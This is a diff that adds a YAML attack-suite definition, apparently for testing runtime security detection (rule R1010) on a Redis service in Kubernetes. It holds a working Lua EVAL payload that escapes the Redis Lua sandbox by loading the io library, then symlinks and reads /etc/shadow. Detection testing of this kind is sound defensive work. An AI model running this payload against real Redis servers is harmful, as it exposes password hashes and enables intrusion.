@@ -1,0 +1,37 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-attack-09-symlink-shadow
+  description: "Create symlink over /etc/shadow. Triggers R1010."
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+attacks:
+  - name: symlink-etc-shadow
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return 'sandbox_blocked' end
+        local f = io_mod.popen('ln -sf /etc/shadow /tmp/shadow_link 2>&1 && cat /tmp/shadow_link 2>/dev/null; rm -f /tmp/shadow_link')
+        local out = f:read('*a')
+        f:close()
+        return 'symlink:' .. out
+    successIndicators:
+      - responseContains: "symlink:"
+expectedDetections:
+  - attackType: fileless
+    ruleID: R1010
+    ruleName: "Soft link created over sensitive file"
+    containerName: redis
